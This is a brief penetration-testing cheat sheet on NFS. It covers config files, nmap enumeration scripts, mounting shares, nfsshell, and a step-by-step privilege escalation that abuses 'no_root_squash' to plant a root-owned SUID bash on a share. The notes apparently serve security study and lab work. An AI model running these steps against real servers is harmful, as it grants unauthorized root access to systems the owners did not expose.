## Configuration files
```
/etc/exports
/etc/lib/nfs/xtab
```

## Enumeration
```
nmap -sV --script=nfs-* 192.168.44.133
nmap -sV --script=nfs-ls 192.168.44.133  //same result as rpcinfo
nmap -sV --script=nfs-* 192.168.44.133
```

Enumerate NFS shares:
```
showmount -e hostname/ip_address
```

Mount NFS shares:
```
mount -t nfs ip_address:/directory_found_exported /local_mount_point
mount -t nfs 192.168.1.72:/home/vulnix /tmp/mnt -nolock
```

`/etc/exports` file contains configurations and permissions of which folders/file systems are exported to remote users

## Root Squashing

Root squashing - Prevents having root access to remote root users connected to NFS volume. Remote root users are assigned a user "nfsnobody" when connected.

`no_root_squash` - Gives the remote user root access to the connected system

With limited user account: `cp /bin/bash /shared`
Then mount the share: `mount -t nfs server:/shared /mnt/` and run `chown root:root bash && chmod u+s bash`
Run the file with limited user account: `/shared/bash`

## Tools

- NFS shell - Provides user level access to an NFS server, over UDP or TCP, supports source routing and "secure" (privileged port) mounts - [https://github.com/NetDirect/nfsshell](https://github.com/NetDirect/nfsshell)
```
nfsshell> host <ip>
nfsshell> mount <name of the share>
nfsshell> gid 1000
nfsshell> uid 1000
nfsshell> put example
nfsshell> chmod 0777 example
```
